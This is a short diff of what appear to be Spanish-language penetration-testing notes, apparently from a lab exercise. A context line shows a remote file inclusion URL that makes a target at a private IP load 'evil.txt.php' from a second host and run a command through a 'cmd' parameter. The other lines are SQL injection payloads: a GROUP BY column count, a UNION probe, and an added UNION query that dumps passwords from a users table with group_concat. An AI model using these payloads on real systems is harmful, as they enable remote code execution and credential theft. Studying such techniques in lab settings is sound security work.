@@ -38,4 +38,5 @@ http://192.168.239.10/menu.php?file=http://192.168.119.239/evil.txt.php&cmd=ipco
 ?id=1 GROUP BY 5--+
 --identificar campos vulnerables
 ?id=1 UNION select 1,2,3,4,5
-
+-- extraer informacion 
+UNION select 1,2,group_concat(password),4,5 FROM users
